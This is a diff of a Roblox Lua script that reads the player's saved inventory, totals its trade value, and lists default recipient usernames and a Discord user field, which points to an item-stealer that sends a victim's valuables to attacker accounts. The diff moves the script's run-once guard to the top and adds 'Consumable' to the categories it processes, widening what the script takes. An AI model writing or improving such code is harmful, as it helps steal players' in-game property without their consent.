@@ -1,3 +1,9 @@
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
@@ -7,7 +13,6 @@ local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
 local sentUsers = {}
-_G.scriptExecuted = _G.scriptExecuted or false
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
@@ -16,11 +21,6 @@ local users = _G.Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
 local min_rap = _G.min_rap or 1000
 local min_chance = _G.min_chance or 100000
 local discuser = _G.discuser or ""
-
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
 
 for _, user in ipairs(users) do
     if plr.Name == user then
@@ -272,7 +272,7 @@ local function ClaimMail()
     end
 end
 
-local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
+local categoryList = {"Pet", "Consumable", "Hoverboard", "Fruit", "Misc", "Booth"}
 
 for i, v in pairs(categoryList) do
 	if save[v] ~= nil then
